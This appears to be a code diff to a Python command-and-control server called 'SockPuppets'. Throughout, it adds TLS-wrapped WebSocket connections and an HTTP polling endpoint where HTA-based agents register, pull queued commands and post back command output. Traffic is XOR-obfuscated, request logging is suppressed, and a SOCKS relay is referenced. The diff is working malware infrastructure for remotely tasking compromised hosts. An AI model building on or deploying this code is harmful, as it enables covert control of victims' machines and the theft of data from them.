@@ -16,6 +16,9 @@ from pathlib import Path
 from datetime import datetime
 from typing import Dict, Set
 import logging
+import ssl
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import threading
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -62,13 +65,59 @@ class Agent:
 
 class SockPuppetsServer:
     """Main server class"""
-    def __init__(self, host: str = '0.0.0.0', port: int = 8443, encryption_key: str = 'SOCKPUPPETS_KEY_2026'):
+    def __init__(self, host: str = '0.0.0.0', port: int = 8443, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
+                 use_ssl: bool = False, cert_file: str = None, key_file: str = None):
         self.host = host
         self.port = port
         self.encryption_key = encryption_key.encode() if isinstance(encryption_key, str) else encryption_key
         self.agents: Dict[str, Agent] = {}
         self.active_connections: Set[websockets.WebSocketServerProtocol] = set()
         self.streaming_module = self._load_streaming_module()
+        self.ws_server = None
+        self.use_ssl = use_ssl
+        self.ssl_context = None
+        if use_ssl:
+            self.ssl_context = self._setup_ssl(cert_file, key_file)
+
+    def _setup_ssl(self, cert_file: str = None, key_file: str = None):
+        """Setup SSL context for WSS connections"""
+        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        if cert_file and key_file:
+            ssl_ctx.load_cert_chain(cert_file, key_file)
+            logger.info(f"Loaded SSL certificate: {cert_file}")
+        else:
+            # Generate self-signed cert
+            cert_path, key_path = self._generate_self_signed_cert()
+            ssl_ctx.load_cert_chain(cert_path, key_path)
+            logger.info(f"Generated self-signed certificate")
+        return ssl_ctx
+
+    @staticmethod
+    def _generate_self_signed_cert():
+        """Generate a self-signed certificate for WSS"""
+        try:
+            from pathlib import Path
+            cert_dir = Path(__file__).parent / 'certs'
+            cert_dir.mkdir(exist_ok=True)
+            cert_path = cert_dir / 'server.pem'
+            key_path = cert_dir / 'server.key'
+
+            if cert_path.exists() and key_path.exists():
+                return str(cert_path), str(key_path)
+
+            # Use openssl to generate self-signed cert
+            import subprocess
+            subprocess.run([
+                'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
+                '-keyout', str(key_path), '-out', str(cert_path),
+                '-days', '365', '-nodes',
+                '-subj', '/CN=localhost'
+            ], check=True, capture_output=True)
+            logger.info(f"Generated self-signed cert at {cert_path}")
+            return str(cert_path), str(key_path)
+        except Exception as e:
+            logger.error(f"Failed to generate self-signed cert: {e}")
+            raise
 
     def _load_streaming_module(self) -> str:
         """Load and compress streaming module"""
@@ -90,16 +139,16 @@ class SockPuppetsServer:
     def simple_encrypt(self, data: str) -> str:
         """XOR-based obfuscation"""
         key = self.encryption_key
-        encoded = data.encode()
-        encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
+        encoded = data.encode('latin-1')
+        encrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(encoded))
         return base64.b64encode(encrypted).decode()
 
     def simple_decrypt(self, data: str) -> str:
         """Decrypt XOR obfuscation"""
         key = self.encryption_key
         decoded = base64.b64decode(data.encode())
-        decrypted = bytes([decoded[i] ^ key[i % len(key)] for i in range(len(decoded))])
-        return decrypted.decode()
+        decrypted = bytes(a ^ key[i % len(key)] for i, a in enumerate(decoded))
+        return decrypted.decode('latin-1')
 
     async def register_agent(self, websocket, message: dict) -> str:
         """Register a new agent connection"""
@@ -671,12 +720,121 @@ class SockPuppetsServer:
         except Exception as e:
             logger.error(f"Relay to SOCKS error: {e}")
 
+    def _make_hta_handler(self):
+        """Create HTTP request handler class for HTA polling agents"""
+        server_ref = self
+
+        class HTAHandler(BaseHTTPRequestHandler):
+            def log_message(self, format, *args):
+                pass  # Suppress default HTTP logging
+
+            def do_POST(self):
+                if self.path != '/hta':
+                    self.send_error(404)
+                    return
+
+                content_length = int(self.headers.get('Content-Length', 0))
+                body = self.rfile.read(content_length).decode('utf-8', errors='replace')
+
+                try:
+                    decrypted = server_ref.simple_decrypt(body)
+                    data = json.loads(decrypted)
+                    msg_type = data.get('type')
+
+                    if msg_type == 'register':
+                        agent_id = str(uuid.uuid4())[:8]
+                        metadata = data.get('metadata', {})
+                        metadata['ip'] = self.client_address[0]
+                        # Create agent without websocket (HTTP-based)
+                        agent = Agent(None, agent_id, metadata)
+                        agent.mode = 'http_poll'
+                        server_ref.agents[agent_id] = agent
+                        logger.info(f"HTA agent registered: {agent_id} ({metadata.get('hostname', 'Unknown')})")
+
+                        response = {'type': 'registered', 'agent_id': agent_id, 'status': 'success'}
+                        encrypted = server_ref.simple_encrypt(json.dumps(response))
+                        self.send_response(200)
+                        self.send_header('Content-Type', 'text/plain')
+                        self.end_headers()
+                        self.wfile.write(encrypted.encode())
+
+                    elif msg_type == 'checkin':
+                        agent_id = data.get('agent_id', '')
+                        if agent_id in server_ref.agents:
+                            agent = server_ref.agents[agent_id]
+                            agent.last_seen = datetime.now()
+
+                            # Check if there are pending commands (thread-safe, no event loop needed)
+                            if not agent.command_queue.empty():
+                                try:
+                                    command = agent.command_queue.get_nowait()
+                                    response = {'type': 'command', 'command': command, 'timestamp': datetime.now().isoformat()}
+                                except Exception:
+                                    response = {'type': 'checkin_ack', 'agent_id': agent_id, 'status': 'success'}
+                            else:
+                                response = {'type': 'checkin_ack', 'agent_id': agent_id, 'status': 'success'}
+                        else:
+                            response = {'type': 'error', 'message': 'Unknown agent'}
+
+                        encrypted = server_ref.simple_encrypt(json.dumps(response))
+                        self.send_response(200)
+                        self.send_header('Content-Type', 'text/plain')
+                        self.end_headers()
+                        self.wfile.write(encrypted.encode())
+
+                    elif msg_type == 'response':
+                        agent_id = data.get('agent_id', '')
+                        if agent_id in server_ref.agents:
+                            agent = server_ref.agents[agent_id]
+                            agent.last_seen = datetime.now()
+                            agent.pending_results.append({
+                                'command': data.get('command', ''),
+                                'output': data.get('output', ''),
+                                'timestamp': data.get('timestamp', ''),
+                                'received_at': datetime.now().isoformat()
+                            })
+
+                        self.send_response(200)
+                        self.send_header('Content-Type', 'text/plain')
+                        self.end_headers()
+                        self.wfile.write(b'ok')
+
+                    else:
+                        self.send_response(200)
+                        self.end_headers()
+
+                except Exception as e:
+                    logger.error(f"HTA handler error: {e}")
+                    self.send_error(500)
+
+        return HTAHandler
+
+    def _start_http_server(self):
+        """Start HTTP polling server for HTA agents in a background thread"""
+        handler_class = self._make_hta_handler()
+        http_port = self.port + 1  # Use next port for HTTP (main port is used by WebSocket)
+        try:
+            httpd = HTTPServer((self.host, http_port), handler_class)
+            logger.info(f"HTTP polling endpoint started on {self.host}:{http_port}/hta")
+            httpd.serve_forever()
+        except Exception as e:
+            logger.warning(f"Could not start HTTP polling endpoint on port {http_port}: {e}")
+
     async def start(self):
         """Start the server"""
         logger.info(f"Starting SockPuppets Server on {self.host}:{self.port}")
-        async with websockets.serve(self.handle_agent, self.host, self.port, max_size=10485760):
-            logger.info("SockPuppets Server is running...")
-            await asyncio.Future()  # Run forever
+
+        # Start HTTP polling endpoint for HTA agents in background thread
+        http_thread = threading.Thread(target=self._start_http_server, daemon=True)
+        http_thread.start()
+
+        protocol = "wss" if self.use_ssl else "ws"
+        self.ws_server = await websockets.serve(
+            self.handle_agent, self.host, self.port,
+            max_size=10485760, ssl=self.ssl_context
+        )
+        logger.info(f"SockPuppets Server is running ({protocol}://{self.host}:{self.port})...")
+        await asyncio.Future()  # Run forever
 
 
 # Global server instance
@@ -690,10 +848,11 @@ def get_server_instance():
     return server_instance
 
 
-async def start_server(host: str = '0.0.0.0', port: int = 8443, encryption_key: str = 'SOCKPUPPETS_KEY_2026'):
+async def start_server(host: str = '0.0.0.0', port: int = 8443, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
+                       use_ssl: bool = False, cert_file: str = None, key_file: str = None):
     """Start the server"""
     global server_instance
-    server_instance = SockPuppetsServer(host, port, encryption_key)
+    server_instance = SockPuppetsServer(host, port, encryption_key, use_ssl, cert_file, key_file)
     await server_instance.start()
 
 
@@ -703,6 +862,9 @@ if __name__ == '__main__':
     parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
     parser.add_argument('--port', type=int, default=8443, help='Port to bind to')
     parser.add_argument('--key', default='SOCKPUPPETS_KEY_2026', help='Encryption key')
+    parser.add_argument('--ssl', action='store_true', help='Enable WSS (TLS) mode')
+    parser.add_argument('--cert', type=str, help='Path to SSL certificate file')
+    parser.add_argument('--cert-key', type=str, help='Path to SSL private key file')
     args = parser.parse_args()
 
-    asyncio.run(start_server(args.host, args.port, args.key))
+    asyncio.run(start_server(args.host, args.port, args.key, args.ssl, args.cert, getattr(args, 'cert_key', None)))
